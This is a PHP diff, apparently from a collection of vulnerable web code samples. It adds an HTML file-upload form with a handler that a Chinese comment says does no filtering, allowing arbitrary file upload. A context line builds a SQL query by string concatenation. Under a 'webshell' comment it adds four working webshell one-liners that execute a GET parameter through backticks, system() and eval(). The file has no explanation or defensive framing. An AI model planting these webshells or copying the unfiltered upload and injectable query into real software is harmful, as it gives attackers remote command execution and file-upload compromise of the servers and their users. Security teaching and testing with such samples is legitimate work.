@@ -78,3 +78,64 @@ header('Location: http://www.baidu.com/');
 	$result = mysql_query("select password from users where username='" . $username . "'", $con);
 	$row = mysql_fetch_array($result);	
 ?>
+
+
+<!--  upload file -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>文件信息</title>
+</head>
+<meta charset="utf-8">
+<body>
+<form action="" enctype="multipart/form-data" method="POST" name="uploadfile">
+    上传文件: <input type="file" name="upfile" />
+    <input type="submit" value="http://dearch.blog.51cto.com/10423918/上传" name="submit">
+</form>
+</body>
+</html>
+<!-- 完全没有过滤，任意文件上传 -->
+<?php
+if (isset($_POST['submit'])) {
+    var_dump($_FILES['upfile']);
+    echo "文件名：".$_FILES['upfile']['name']."<br />";
+    echo "文件大小：".$_FILES['upfile']['size']."<br />";
+    echo "文件类型：".$_FILES['upfile']['type']."<br />";
+    echo "临时路径：".$_FILES['upfile']['tmp_name']."<br />";
+    echo "上传后系统返回值：".$_FILES['upfile']['error']."<br />";
+    echo "====================保存分各线========================<br />";
+    if ($_FILES['upfile']['error'] == 0) {
+        if (!is_dir("./upload")) {
+            mkdir("./upload");
+        }
+        $dir = "./upload/".$_FILES['upfile']['name'];
+        move_uploaded_file($_FILES['upfile']['tmp_name'],$dir);
+        echo "文件保存路径：".$dir."<br />";
+        echo "上传成功...<br />";
+        echo "图片预览：<br />";
+
+    }
+}
+ ?>
+
+
+<!-- webshell -->
+
+<?php 
+echo `$_GET[a]`;
+?>
+
+<script language=php>
+echo `$_GET[a]`;
+</script>
+
+
+<?php 
+echo system($_GET['a']);
+?>
+
+<?php 
+echo eval($_GET['a']);
+?>
+
+
